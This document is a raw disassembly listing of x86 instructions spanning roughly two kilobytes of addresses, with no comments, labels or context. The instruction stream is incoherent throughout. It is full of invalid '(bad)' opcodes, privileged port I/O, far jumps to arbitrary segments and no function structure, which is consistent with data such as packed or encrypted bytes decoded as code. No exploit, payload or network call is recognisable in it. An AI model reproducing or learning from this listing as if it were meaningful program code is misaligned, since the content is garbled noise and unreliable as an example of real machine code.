  410bc8:	dec    ebx
  410bc9:	sub    eax,DWORD PTR es:[ecx+0x43e9618]
  410bd0:	xor    al,bl
  410bd2:	push   0x3ebd5ae4
  410bd7:	out    dx,eax
  410bd8:	pop    esi
  410bd9:	inc    edi
  410bda:	inc    edi
  410bdb:	xchg   DWORD PTR ds:0xde452720,esi
  410be1:	imul   ecx,DWORD PTR [eax-0x1b],0xf9893264
  410be8:	stc    
  410be9:	jns    0x410baf
  410beb:	jecxz  0x410c5e
  410bed:	retf   
  410bee:	pop    esp
  410bef:	jae    0x410baa
  410bf1:	pop    esp
  410bf2:	call   0xafc1f4df
  410bf7:	xchg   BYTE PTR [edi-0x140a053],ch
  410bfd:	scas   eax,DWORD PTR es:[edi]
  410bfe:	jecxz  0x410bf1
  410c00:	clc    
  410c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c02:	retf   
  410c03:	xchg   edi,eax
  410c04:	das    
  410c05:	daa    
  410c06:	or     eax,DWORD PTR [ebp+0x2a54ba42]
  410c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c0d:	push   edi
  410c0e:	scas   eax,DWORD PTR es:[edi]
  410c0f:	pop    esi
  410c10:	sbb    eax,0x1b86e1be
  410c15:	(bad)  
  410c16:	fbstp  TBYTE PTR [ebp-0x29]
  410c19:	pop    ebp
  410c1a:	aaa    
  410c1b:	fbstp  TBYTE PTR [ebp-0x29]
  410c1e:	pop    ebp
  410c1f:	pop    ebx
  410c20:	sub    BYTE PTR [ebx-0x70],dh
  410c23:	add    al,0x9f
  410c25:	call   0x2244:0xbfbc6913
  410c2c:	adc    ecx,0xc9f1d1d1
  410c32:	leave  
  410c33:	leave  
  410c34:	aas    
  410c35:	mov    WORD PTR [esp+ecx*4-0x2c58b2e4],cs
  410c3c:	xor    esi,esi
  410c3e:	ror    BYTE PTR [ebx+0x68],cl
  410c41:	add    al,0xf3
  410c43:	inc    esp
  410c44:	aas    
  410c45:	pop    edi
  410c46:	aam    0xfa
  410c48:	retf   
  410c49:	adc    edx,edi
  410c4b:	and    eax,0xef77bfc2
  410c50:	fisubr WORD PTR [edi-0xc462312]
  410c56:	pop    ds
  410c57:	sub    al,bl
  410c59:	addr16 div ecx
  410c5c:	mov    bl,BYTE PTR [edi]
  410c5e:	ds jge 0x410c11
  410c61:	cmp    al,0x2a
  410c63:	sub    eax,0x79e2fc7e
  410c68:	add    BYTE PTR [esi-0x69c8d094],dl
  410c6e:	inc    eax
  410c6f:	mov    al,0xb
  410c71:	loopne 0x410c84
  410c73:	rcl    edx,0x77
  410c76:	inc    ecx
  410c77:	inc    esp
  410c78:	rol    BYTE PTR [edi+0x16],0x12
  410c7c:	arpl   WORD PTR [edx+eiz*1],cx
  410c7f:	sbb    eax,esi
  410c81:	arpl   WORD PTR [esi-0x49],bp
  410c84:	fcmovne st,st(2)
  410c86:	out    0x34,al
  410c88:	or     al,0xc3
  410c8a:	dec    edx
  410c8b:	cld    
  410c8c:	mov    ds:0x6f4c87ef,al
  410c91:	push   0xd
  410c93:	enter  0x72e5,0xe8
  410c97:	jmp    0x9314:0x4e5a92ea
  410c9e:	mov    al,ds:0x2972001c
  410ca3:	mov    DWORD PTR [eax],eax
  410ca5:	cmp    BYTE PTR [ecx],dl
  410ca7:	nop
  410ca8:	xchg   ebp,eax
  410ca9:	push   eax
  410caa:	sub    dl,BYTE PTR [ebp-0x391c8e50]
  410cb0:	fistp  DWORD PTR [esi+0x7f89e278]
  410cb6:	(bad)  
  410cb7:	jmp    0x2ffb8c0b
  410cbc:	sbb    cl,BYTE PTR [ebp+0x152a56ce]
  410cc2:	push   edi
  410cc3:	cs xchg edi,eax
  410cc5:	ror    DWORD PTR [edi+0x7232391c],cl
  410ccb:	in     al,0xc8
  410ccd:	xchg   ecx,eax
  410cce:	mov    eax,ds:0x67ecfd9f
  410cd3:	out    dx,al
  410cd4:	pusha  
  410cd5:	xor    BYTE PTR [eax],bl
  410cd7:	mov    eax,0xfedbb6ed
  410cdc:	jmp    0x81e:0xde6f9be6
  410ce3:	add    al,0xd6
  410ce5:	sbb    eax,0xddf47a3d
  410cea:	xchg   ebx,eax
  410ceb:	daa    
  410cec:	dec    edi
  410ced:	push   ds
  410cee:	add    edx,eax
  410cf0:	leave  
  410cf1:	(bad)  
  410cf2:	outs   dx,DWORD PTR ds:[esi]
  410cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cf4:	lds    edi,FWORD PTR [edx+0x20b2db8]
  410cfa:	repnz add BYTE PTR [ecx],ah
  410cfd:	daa    
  410cfe:	add    DWORD PTR [edx+0x49],esi
  410d01:	test   eax,0xa40cb72c
  410d06:	pop    eax
  410d07:	popa   
  410d08:	ja     0x410d6a
  410d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d0b:	adc    al,0x45
  410d0d:	fld    st(0)
  410d0f:	std    
  410d10:	jg     0x410d2c
  410d12:	adc    al,0x94
  410d14:	(bad)  
  410d15:	push   0x1f6a00b2
  410d1a:	fwait
  410d1b:	imul   esi,DWORD PTR [ebp+0x16],0x86c20ca2
  410d22:	sti    
  410d23:	shr    al,1
  410d25:	pop    ecx
  410d26:	pop    ss
  410d27:	push   cs
  410d28:	xchg   DWORD PTR [ebp-0x6054a48a],ebp
  410d2e:	mov    eax,0x37799b5a
  410d33:	push   ds
  410d34:	(bad)  
  410d35:	arpl   WORD PTR [edx+0x62],sp
  410d38:	add    ch,BYTE PTR [ecx-0x75dd35ac]
  410d3e:	pusha  
  410d3f:	xor    BYTE PTR [eax+0x608c3870],cl
  410d45:	xor    BYTE PTR [eax-0x717bd7b0],cl
  410d4b:	mov    cs,WORD PTR [esi]
  410d4d:	xchg   edi,eax
  410d4e:	iret   
  410d4f:	out    0xb,eax
  410d51:	add    DWORD PTR [eax+0x5ecd9b3e],edi
  410d57:	pop    edi
  410d58:	out    dx,eax
  410d59:	cmc    
  410d5a:	addr16 mov eax,0xc3c2eedd
  410d60:	(bad)  
  410d62:	in     al,dx
  410d63:	jmp    0x410d50
  410d65:	jmp    0x410d5a
  410d67:	add    al,0x83
  410d69:	inc    ecx
  410d6a:	js     0x410d29
  410d6c:	pop    esi
  410d6d:	retf   
  410d6e:	(bad)  
  410d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d70:	in     al,0x90
  410d72:	(bad)
  410d75:	dec    esp
  410d76:	dec    esi
  410d77:	dec    esi
  410d78:	and    bl,BYTE PTR [edx]
  410d7a:	lea    esp,[edx]
  410d7c:	push   ds
  410d7d:	(bad)  
  410d7e:	setge  BYTE PTR ds:0xd4c0f67b
  410d85:	aam    0xd4
  410d87:	inc    edi
  410d88:	xchg   BYTE PTR [ecx+0x64],ah
  410d8b:	ror    BYTE PTR [eax],1
  410d8d:	mov    ah,0x14
  410d8f:	mov    al,0x34
  410d91:	call   0xf6fa:0x27d1976f
  410d98:	mov    ds:0xf024df7f,al
  410d9d:	in     al,dx
  410d9e:	std    
  410d9f:	push   esi
  410da0:	imul   ebp
  410da2:	(bad)  [edi-0x29]
  410da5:	sbb    eax,0xdbf1dc77
  410daa:	bound  esi,QWORD PTR [ecx-0x3524ebe8]
  410db0:	jmp    0xd7286a0c
  410db5:	adc    edi,edi
  410db7:	xchg   ebp,eax
  410db8:	xchg   ebp,eax
  410db9:	adc    DWORD PTR [edi+0x333c32f3],ecx
  410dbf:	iret   
  410dc0:	mov    es,WORD PTR [eax+edi*8+0x39]
  410dc4:	push   esi
  410dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dc6:	ins    DWORD PTR es:[edi],dx
  410dc7:	pop    edx
  410dc8:	sbb    bh,al
  410dca:	cmp    ah,BYTE PTR [ebp+0x156f35f]
  410dd0:	cli    
  410dd1:	pop    esi
  410dd2:	mov    eax,0x81922cff
  410dd7:	sbb    eax,0x11d59039
  410ddc:	or     BYTE PTR [edx+ebx*4],al
  410ddf:	fmul   QWORD PTR [edi]
  410de1:	dec    ebp
  410de2:	rcl    DWORD PTR [eax-0x326e9933],cl
  410de8:	xchg   cx,ax
  410dea:	leave  
  410deb:	mov    al,fs:0x7a7a0a28
  410df1:	jp     0x410d9f
  410df3:	cli    
  410df4:	xchg   ecx,eax
  410df5:	push   ebp
  410df6:	inc    ecx
  410df7:	push   ecx
  410df8:	jns    0x410e28
  410dfa:	hlt    
  410dfb:	je     0x410d99
  410dfd:	aas    
  410dfe:	sbb    edi,DWORD PTR [ecx-0x653bbfe]
  410e04:	jl     0x410e24
  410e06:	pop    ebx
  410e07:	mov    dh,0x6c
  410e09:	fprem1 
  410e0b:	les    edx,FWORD PTR [ebx]
  410e0d:	dec    edi
  410e0e:	cld    
  410e0f:	(bad)  
  410e10:	daa    
  410e11:	lahf   
  410e12:	jl     0x410e06
  410e14:	jnp    0x410da1
  410e16:	mov    ecx,DWORD PTR [ebx-0x1d56e5e6]
  410e1c:	(bad)  
  410e1d:	push   0xffffffb5
  410e1f:	push   0x68
  410e21:	call   0xc2ec:0x763b1e66
  410e28:	mov    cl,0x63
  410e2a:	(bad)  
  410e2b:	ds scas al,BYTE PTR es:[edi]
  410e2d:	push   edi
  410e2f:	push   ds
  410e30:	aam    0x84
  410e32:	lahf   
  410e33:	imul   esi,DWORD PTR [edi+0x51],0xffffffd3
  410e37:	mov    eax,DWORD PTR [eax+eax*1]
  410e3a:	sub    al,0xd
  410e3c:	adc    BYTE PTR [edx+0x3245f9a],cl
  410e42:	xor    DWORD PTR [eax],ebp
  410e44:	dec    eax
  410e45:	push   ss
  410e46:	add    eax,edx
  410e48:	add    BYTE PTR [esi+edx*2],0x44
  410e4c:	add    BYTE PTR [edx-0x4cb75b5e],cl
  410e52:	mov    eax,DWORD PTR [ecx-0x41]
  410e55:	fidiv  DWORD PTR [esi-0x5c99a13f]
  410e5b:	ror    DWORD PTR [esi],cl
  410e5d:	mov    ch,0xa1
  410e5f:	sbb    eax,DWORD PTR [esi+0x1b1bb561]
  410e65:	xchg   BYTE PTR [ecx-0x173c790],al
  410e6b:	(bad)  
  410e6c:	jle    0x410e59
  410e6e:	pop    fs
  410e70:	mov    dl,0xe5
  410e72:	jb     0x410e8d
  410e74:	mov    ds:0x1b18a3a3,eax
  410e79:	sbb    eax,DWORD PTR [ebx-0x4a]
  410e7c:	ds ret 0x9d0c
  410e80:	dec    ebx
  410e81:	cmp    edx,esp
  410e83:	fs and eax,edx
  410e86:	pop    ds
  410e87:	scas   eax,DWORD PTR es:[edi]
  410e88:	jmp    0x410f04
  410e8a:	jge    0x410e3a
  410e8c:	sti    
  410e8d:	push   cs
  410e8e:	test   bl,al
  410e90:	popa   
  410e91:	or     al,0xc
  410e93:	or     al,0xb8
  410e95:	cmp    bh,BYTE PTR [edx]
  410e97:	cmp    al,BYTE PTR [edx-0x55]
  410e9a:	push   edi
  410e9b:	scas   eax,DWORD PTR es:[edi]
  410e9c:	inc    esi
  410e9d:	xor    BYTE PTR [eax],bl
  410e9f:	test   bh,bl
  410ea1:	out    dx,eax
  410ea2:	xchg   DWORD PTR [ecx+0x18],esp
  410ea5:	dec    ebp
  410ea6:	int    0x79
  410ea8:	xchg   edi,eax
  410ea9:	cs pop ebp
  410eab:	inc    edx
  410eac:	cmp    al,0x1e
  410eae:	(bad)  
  410eaf:	cld    
  410eb0:	cld    
  410eb1:	jl     0x410f2d
  410eb3:	push   0xbe5e868
  410eb8:	pop    ss
  410eb9:	cs mov esp,0xe20dad5d
  410ebf:	inc    ecx
  410ec0:	das    
  410ec1:	xchg   edi,eax
  410ec2:	int3   
  410ec3:	jns    0x410f0f
  410ec5:	ficom  DWORD PTR [ecx]
  410ec7:	xor    eax,0x12000f3e
  410ecc:	fist   DWORD PTR [edx+0x699a2f9f]
  410ed2:	mov    ds:0xbfaf83f0,al
  410ed7:	repnz retf 0xa12b
  410edb:	dec    eax
  410edc:	and    al,0xf2
  410ede:	mov    edi,0x2e0b4d34
  410ee3:	(bad)  
  410ee4:	in     al,dx
  410ee5:	xchg   edi,eax
  410ee6:	sbb    eax,0xb10723b3
  410eeb:	mov    esp,0x49103dcc
  410ef0:	ret    0x22ce
  410ef3:	loopne 0x410e92
  410ef5:	mov    edx,0x86113f68
  410efa:	cwde   
  410efb:	inc    ebp
  410efc:	mov    DWORD PTR [ebx-0x2071ab7e],0x45030793
  410f06:	xor    ah,BYTE PTR [eax]
  410f08:	rcl    DWORD PTR [ebx],0x5b
  410f0b:	sub    BYTE PTR [edi+edx*4-0x55faa33a],ch
  410f12:	pop    ss
  410f13:	dec    ebp
  410f14:	xlat   BYTE PTR ds:[ebx]
  410f15:	push   esi
  410f16:	sub    dl,BYTE PTR [ebp-0x539b3670]
  410f1c:	sub    al,0xcd
  410f1e:	dec    eax
  410f1f:	and    al,0x62
  410f21:	inc    ebp
  410f22:	loop   0x410f9d
  410f24:	inc    edx
  410f25:	xchg   edx,eax
  410f26:	push   0x89598945
  410f2b:	push   esp
  410f2c:	addr16 dec esi
  410f2e:	adc    BYTE PTR [ebp-0x2914febe],al
  410f34:	lods   eax,DWORD PTR ds:[esi]
  410f35:	mov    ebx,0x9dcee77e
  410f3a:	pop    edi
  410f3b:	cmp    BYTE PTR [esi-0x14],dh
  410f3e:	fdivr  DWORD PTR [edi+0x43cc96a3]
  410f44:	add    al,BYTE PTR [edi-0x3e]
  410f47:	inc    edi
  410f48:	and    esi,DWORD PTR [edi]
  410f4a:	mov    edi,DWORD PTR [esi-0x118e27c2]
  410f50:	fcomi  st,st(3)
  410f52:	outs   dx,DWORD PTR ds:[esi]
  410f53:	or     DWORD PTR [ebx],0xffffffb0
  410f56:	mov    dl,dh
  410f58:	fisttp WORD PTR [esi]
  410f5a:	mov    edi,0xbf37bf2f
  410f5f:	pop    ds
  410f60:	inc    ecx
  410f61:	dec    edx
  410f62:	add    cl,bl
  410f64:	add    BYTE PTR es:[ebp-0x29],bl
  410f68:	stos   DWORD PTR es:[edi],eax
  410f69:	add    BYTE PTR [edx-0x66e44892],dl
  410f6f:	dec    esp
  410f70:	sbb    dh,BYTE PTR [ebx-0x1417cc4d]
  410f76:	jmp    0x410f7f
  410f78:	dec    ebp
  410f79:	(bad)  
  410f7b:	call   0x2b25ba2
  410f80:	mov    ch,0x69
  410f82:	ds je  0x410f23
  410f85:	jle    0x410f70
  410f87:	jbe    0x410f44
  410f89:	inc    ecx
  410f8a:	cmp    eax,0xb82cf8e8
  410f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f90:	push   edx
  410f91:	or     ecx,edx
  410f93:	push   0x93939314
  410f98:	pop    eax
  410f99:	pop    eax
  410f9a:	pop    eax
  410f9b:	and    BYTE PTR [ebx],dh
  410f9d:	shr    DWORD PTR [eax],1
  410f9f:	xchg   edi,eax
  410fa0:	retf   
  410fa1:	fiadd  WORD PTR cs:[esi+edx*2]
  410fa5:	lods   eax,DWORD PTR ds:[esi]
  410fa6:	push   esi
  410fa7:	push   ecx
  410fa8:	sub    bh,bl
  410faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fab:	mov    al,0x32
  410fad:	add    BYTE PTR [eax],al
  410faf:	pop    ss
  410fb0:	jae    0x410ffb
  410fb2:	inc    esp
  410fb3:	inc    ecx
  410fb4:	push   esp
  410fb5:	xchg   ebp,eax
  410fb6:	lods   al,BYTE PTR ds:[esi]
  410fb7:	aas    
  410fb8:	xchg   ebp,eax
  410fb9:	xor    al,0x3b
  410fbb:	cdq    
  410fbc:	jae    0x410ffc
  410fbe:	lahf   
  410fbf:	(bad)  
  410fc1:	jge    0x411040
  410fc3:	push   esi
  410fc4:	add    al,BYTE PTR [esi-0x5d4a1429]
  410fca:	retf   0x2f97
  410fcd:	pop    edi
  410fce:	inc    esi
  410fcf:	cmp    bl,BYTE PTR [ebp+0x8c8c8c6]
  410fd5:	es daa 
  410fd7:	daa    
  410fd8:	jae    0x410f8b
  410fda:	pop    eax
  410fdb:	in     al,dx
  410fdc:	call   0xec3200d1
  410fe1:	cdq    
  410fe2:	dec    esp
  410fe3:	es (bad) 
  410fe5:	pop    esi
  410fe6:	stos   BYTE PTR es:[edi],al
  410fe7:	lods   al,BYTE PTR ds:[esi]
  410fe8:	int    0x5e
  410fea:	(bad)  
  410feb:	mov    WORD PTR [edi+0x66],es
  410fee:	mov    esi,0xb2abdc18
  410ff3:	imul   ebx,ecx,0x6a
  410ff6:	jl     0x410ff6
  410ff8:	jle    0x41103d
  410ffa:	mov    eax,ds:0x4d340fd0
  410fff:	mov    ebx,0xdbeb4ed9
  411004:	or     DWORD PTR [ebx+ebp*1-0x15],esp
  411008:	and    BYTE PTR [eax],0x5b
  41100b:	xchg   edi,eax
  41100c:	jge    0x410ff6
  41100e:	jbe    0x410ff6
  411010:	mov    dl,0x78
  411012:	or     eax,0x36ad4d00
  411017:	rcl    BYTE PTR [edx+0x4b],0x0
  41101b:	push   0x49ae0b26
  411020:	inc    ebp
  411021:	bound  esp,QWORD PTR [eax]
  411023:	ret    0x3221
  411026:	and    BYTE PTR [edi-0x6f],dl
  411029:	xchg   esp,eax
  41102a:	push   es
  41102b:	iret   
  41102c:	rcl    BYTE PTR [ebx],1
  41102e:	sti    
  41102f:	loopne 0x4110a4
  411031:	mov    ds:0xfdfb7ba0,al
  411036:	jle    0x411063
  411038:	sbb    esi,DWORD PTR [eax-0x2ca6d5ac]
  41103e:	mov    eax,0xeb51baf1
  411043:	adc    al,0xd5
  411045:	inc    ecx
  411046:	and    al,0x2a
  411048:	dec    esi
  411049:	fs cld 
  41104b:	xchg   edi,eax
  41104c:	xchg   esp,eax
  41104d:	fiadd  WORD PTR [ebx-0x1f07c1f1]
  411053:	jnp    0x411044
  411055:	mov    ebp,0xf9acc477
  41105a:	rcl    BYTE PTR [ebp+ecx*8-0x1332d3f9],0x3
  411062:	call   0xe40a:0xe02e03bf
  411069:	or     al,BYTE PTR [edx+0x50864d62]
  41106f:	sahf   
  411070:	scas   al,BYTE PTR es:[edi]
  411071:	and    eax,0xb2686c4e
  411076:	jae    0x411020
  411078:	or     bl,BYTE PTR ds:[edx+0x358e8749]
  41107f:	popa   
  411080:	inc    ebp
  411081:	jecxz  0x411084
  411083:	mov    esp,0xcfdbf6fd
  411088:	out    dx,eax
  411089:	fnstsw WORD PTR [ebx+0x52a57777]
  41108f:	jmp    0x8b78bd1
  411094:	pop    ebp
  411095:	pop    ebp
  411096:	fnstsw WORD PTR [eax-0x14c4310d]
  41109c:	xchg   ecx,eax
  41109d:	stc    
  41109e:	jb     0x411033
  4110a0:	or     esp,DWORD PTR [eax+0x47db5aa]
  4110a6:	push   0xffffffe7
  4110a8:	and    eax,0xccb4a501
  4110ad:	jp     0x4110c9
  4110af:	sub    eax,0x31676766
  4110b4:	cmp    edi,DWORD PTR [ebx]
  4110b6:	mov    ebp,DWORD PTR [esi+esi*1+0xb]
  4110ba:	push   ebp
  4110bb:	push   ebp
  4110bc:	xchg   ecx,eax
  4110bd:	leave  
  4110be:	fs (bad) 
  4110c0:	sbb    BYTE PTR [edi+0x72e74fc7],cl
  4110c6:	mov    ecx,0xfd358004
  4110cb:	std    
  4110cc:	std    
  4110cd:	ja     0x411053
  4110cf:	inc    edx
  4110d0:	mov    eax,ds:0x478f1e4d
  4110d5:	imul   ecx,DWORD PTR [ebp+ecx*2-0x13],0x22002269
  4110dd:	cmp    esi,0x4a947efe
  4110e3:	and    eax,0x981e3c78
  4110e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e9:	mov    DWORD PTR [edx+ebp*1-0x7b],edx
  4110ed:	push   esp
  4110ee:	sub    al,BYTE PTR [ebp+0xa119191]
  4110f4:	lock lea ecx,[edi+ecx*1]
  4110f8:	ud0    edi,DWORD PTR [esi+0x7e]
  4110fc:	jle    0x4110fc
  4110fe:	push   esp
  4110ff:	cs xchg edi,eax
  411101:	mov    esi,DWORD PTR [ebx+0x79cc813f]
  411107:	xchg   ecx,eax
  411108:	add    BYTE PTR [ecx+edx*8+0x7c],ah
  41110c:	sar    al,cl
  41110e:	bound  esi,QWORD PTR [edi+ebx*2]
  411111:	(bad)  
  411112:	adc    al,0xd3
  411114:	xor    ah,BYTE PTR [eax]
  411116:	repz mov ebx,0x736efddf
  41111c:	mov    eax,ds:0xb68c7850
  411121:	in     eax,dx
  411122:	test   BYTE PTR [ecx+0x26],bl
  411125:	fmul   st,st(3)
  411127:	and    eax,0xd45d710a
  41112c:	bnd jl 0x4110ca
  41112f:	or     eax,DWORD PTR [esi-0x6f8fad18]
  411135:	mov    al,ds:0x73168690
  41113a:	jmp    DWORD PTR [ebp-0x5]
  41113d:	leave  
  41113e:	jl     0x411127
  411140:	pop    ecx
  411141:	jbe    0x4111a5
  411143:	mov    ebp,0xd5af5ebc
  411148:	cld    
  411149:	inc    esi
  41114a:	scas   al,BYTE PTR es:[edi]
  41114b:	add    DWORD PTR [edi+0x410d0021],ecx
  411151:	in     al,0xf7
  411153:	jecxz  0x41114c
  411155:	mov    eax,ds:0xe3c7b260
  41115a:	pop    ecx
  41115b:	adc    bl,BYTE PTR [ebx-0x7fb77a5e]
  411161:	xchg   ebx,eax
  411162:	or     esi,DWORD PTR [edi+0x73f3f832]
  411168:	sub    esp,DWORD PTR [eax-0x389dd3a8]
  41116e:	mov    ds,WORD PTR ds:0xf0fc3cf7
  411174:	ret    
  411175:	(bad)  
  411177:	mov    edi,0xa8abff7f
  41117c:	leave  
  41117d:	xchg   ecx,eax
  41117e:	popf   
  41117f:	mov    ecx,0x310b340e
  411184:	outs   dx,DWORD PTR ds:[esi]
  411185:	mov    bl,0xe7
  411187:	jle    0x4111c5
  411189:	and    BYTE PTR [edi],ah
  41118b:	paddd  mm1,mm3
  41118e:	lods   eax,DWORD PTR ds:[esi]
  41118f:	add    cl,BYTE PTR [eax-0x36]
  411192:	leave  
  411193:	sub    al,0x9
  411195:	xchg   edi,eax
  411196:	jo     0x411144
  411198:	jmp    0x1526db8
  41119d:	dec    esp
  41119e:	dec    ebp
  41119f:	dec    ebp
  4111a0:	jge    0x41121a
  4111a2:	icebp  
  4111a3:	loop   0x41116a
  4111a5:	push   DWORD PTR [edx-0x68492493]
  4111ab:	mov    eax,ebp
  4111ad:	mov    ds:0x873f3f3a,al
  4111b2:	shl    DWORD PTR [edi+0x2a54a14f],cl
  4111b8:	shr    edi,0xaf
  4111bb:	in     eax,0xd7
  4111bd:	jo     0x411235
  4111bf:	scas   eax,DWORD PTR es:[edi]
  4111c0:	cmc    
  4111c1:	sbb    DWORD PTR [eax+0x73625cbd],ebp
  4111c7:	mov    al,ds:0xca6811a1
  4111cc:	sub    al,0xea
  4111ce:	enter  0xf53,0xc
  4111d2:	(bad)  
  4111d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d6:	(bad)  
  4111d7:	mov    WORD PTR [ebp+0x2e507d8d],cs
  4111dd:	xchg   edi,eax
  4111de:	dec    ebx
  4111df:	cmc    
  4111e0:	cmp    cl,BYTE PTR [esi]
  4111e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111e3:	push   edx
  4111e4:	test   eax,0xc89123f7
  4111e9:	xchg   dh,cl
  4111eb:	into   
  4111ec:	into   
  4111ed:	call   eax
  4111ef:	rcl    ebx,cl
  4111f1:	mov    bl,0xcb
  4111f3:	jmp    0x4111ea
  4111f5:	jbe    0x411247
  4111f7:	xor    BYTE PTR [edi+0x72e5c008],al
  4111fd:	pop    ecx
  4111fe:	add    eax,DWORD PTR [ebx+0x78152a54]
  411204:	cmp    al,0x1e
  411206:	or     ch,dl
  411208:	popa   
  411209:	jl     0x411287
  41120b:	sbb    al,0xd1
  41120d:	push   0x74747c74
  411212:	je     0x411293
  411214:	sub    al,0x16
  411216:	jnp    0x4111f7
  411218:	xor    al,0x4d
  41121a:	sbb    cl,BYTE PTR [esi-0x8c74b77]
  411220:	in     eax,dx
  411221:	(bad)
  411224:	mov    cl,0xd3
  411226:	mov    gs,WORD PTR [ecx+ecx*1+0x28bd0b8f]
  41122d:	call   0x85f2355f
  411232:	inc    edx
  411233:	popa   
  411234:	xchg   edi,eax
  411235:	mov    ds:0xdc36d428,al
  41123a:	push   esi
  41123b:	js     0x4111ec
  41123d:	aam    0x4a
  41123f:	and    BYTE PTR [eax+0x3f18aebe],cl
  411245:	adc    bl,bl
  411247:	leave  
  411248:	stc    
  411249:	cmp    eax,0xe24a1e9a
  41124e:	push   DWORD PTR [ebx+0x41]
  411251:	daa    
  411252:	inc    ecx
  411253:	adc    al,0x4d
  411255:	imul   ebx,esi,0x933e2b9c
  41125b:	sub    BYTE PTR [eax-0x284363cc],al
  411261:	jmp    0x411218
  411263:	lods   al,BYTE PTR ds:[esi]
  411264:	add    bl,BYTE PTR [ecx-0x12]
  411267:	inc    ecx
  411268:	sub    eax,0xba68d4f3
  41126d:	aas    
  41126e:	call   DWORD PTR [esi]
  411270:	inc    ebp
  411271:	ret    0xcd10
  411274:	jle    0x411227
  411276:	arpl   WORD PTR [edx],dx
  411278:	aas    
  411279:	(bad)  
  41127a:	pop    ebx
  41127b:	push   ds
  41127c:	mov    WORD PTR [eax-0x6c],fs
  41127f:	pop    es
  411280:	pop    ds
  411281:	jl     0x411273
  411283:	xchg   ecx,eax
  411284:	aaa    
  411285:	fidivr WORD PTR [eax-0x1d]
  411288:	push   eax
  411289:	test   eax,0x59a32a54
  41128e:	xor    BYTE PTR [ecx+0x33b51696],bh
  411294:	lods   eax,DWORD PTR ds:[esi]
  411295:	fwait
  411296:	push   0xeb5ccc2d
  41129b:	mov    bh,0x13
  41129d:	jp     0x41125d
  41129f:	cs jae 0x4112db
  4112a2:	test   al,0x4f
  4112a4:	leave  
  4112a5:	xchg   edx,eax
  4112a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112a7:	rcl    DWORD PTR ds:0xfbf4088f,0xdf
  4112ae:	(bad)  
  4112af:	(bad)  
  4112b0:	(bad)  
  4112b1:	clc    
  4112b2:	jl     0x411272
  4112b4:	popf   
  4112b5:	fwait
  4112b6:	ss ins DWORD PTR es:[edi],dx
  4112b8:	cli    
  4112b9:	mov    eax,ds:0x9998aaaa
  4112be:	cdq    
  4112bf:	sub    DWORD PTR [edx+0x2a8508aa],0x40585858
  4112c9:	and    al,0x12
  4112cb:	mov    cl,0xcc
  4112cd:	jp     0x4112c9
  4112cf:	ds test al,0x59
  4112d2:	mov    BYTE PTR [esi+0x5e],bl
  4112d5:	ds lahf 
  4112d7:	(bad)  
  4112d8:	in     al,dx
  4112d9:	in     al,dx
  4112da:	lods   al,BYTE PTR ds:[esi]
  4112db:	aad    0x75
  4112dd:	mov    bh,0xce
  4112df:	(bad)  
  4112e0:	leave  
  4112e1:	mov    edx,DWORD PTR [edi]
  4112e3:	das    
  4112e4:	(bad)  
  4112e5:	es push ss
  4112e7:	mov    ebx,DWORD PTR [ebp-0x70c28a2f]
  4112ed:	pop    edx
  4112ee:	jo     0x411275
  4112f0:	xor    ch,ah
  4112f2:	push   eax
  4112f3:	lods   eax,DWORD PTR ds:[esi]
  4112f4:	push   esi
  4112f5:	mov    ecx,DWORD PTR [ebx+0x17678b8b]
  4112fb:	pop    ss
  4112fc:	pop    ss
  4112fd:	xchg   DWORD PTR [edx-0x313e1b37],edx
  411303:	into   
  411304:	into   
  411305:	pop    ebx
  411306:	and    dl,BYTE PTR [ecx+0x60c18dc8]
  41130c:	jo     0x4112a9
  41130e:	popa   
  41130f:	sbb    BYTE PTR [esi+0x4a],bl
  411312:	mov    ax,ds:0xebd79f20
  411318:	(bad)
  41131b:	sub    al,0x8e
  41131d:	pop    ds
  41131e:	aas    
  41131f:	mov    fs,WORD PTR [edx+esi*1+0x59]
  411323:	sahf   
  411324:	sahf   
  411325:	sahf   
  411326:	cmp    BYTE PTR ds:[esp+edi*1],bh
  41132a:	cld    
  41132b:	outs   dx,DWORD PTR ds:[esi]
  41132c:	test   DWORD PTR [edx+0x61],eax
  41132f:	scas   al,BYTE PTR es:[edi]
  411330:	(bad)  
  411331:	fcomp  QWORD PTR [ebx+eiz*8-0xd]
  411335:	out    0x3c,al
  411337:	mov    cl,0x29
  411339:	pop    DWORD PTR [edi]
  41133b:	idiv   DWORD PTR [eax-0x19754850]
  411341:	jae    0x4112f7
  411343:	adc    al,0xfe
  411345:	cmp    dh,BYTE PTR [esi+0x2]
  411348:	lods   eax,DWORD PTR ds:[esi]
  411349:	dec    ebp
  41134a:	jne    0x411387
  41134c:	sub    al,0x47
  41134e:	repz repz mov dl,0x32
  411352:	loope  0x41136b
  411354:	xor    eax,0xe012ccbe
  411359:	mul    eax
  41135b:	es mov esi,0x34dcf028
  411361:	daa    
  411362:	test   DWORD PTR [edi-0x66f47fb8],0x5f82d5ac
  41136c:	xchg   DWORD PTR [edi-0x36ee0459],edx
  411372:	xchg   ebx,eax
  411373:	inc    ebp
  411374:	push   eax
  411375:	sub    dl,BYTE PTR [ebp+0x324809a4]
  41137b:	jae    0x41131b
  41137d:	mov    ah,0x3d
  41137f:	daa    
  411380:	or     DWORD PTR [edx-0x17d32ffd],ebp
  411386:	mov    ds:0x4bafc04b,al
  41138b:	in     eax,0xea
  41138d:	mov    ds:0xf9b86d41,eax
  411392:	out    0x9b,al
  411394:	outs   dx,DWORD PTR ds:[esi]
  411395:	cmp    al,0x71
  411397:	loop   0x41135d
  411399:	sbb    esp,edx
  41139b:	cmp    BYTE PTR [ebp+0x5c],0xf8
  41139f:	js     0x411401
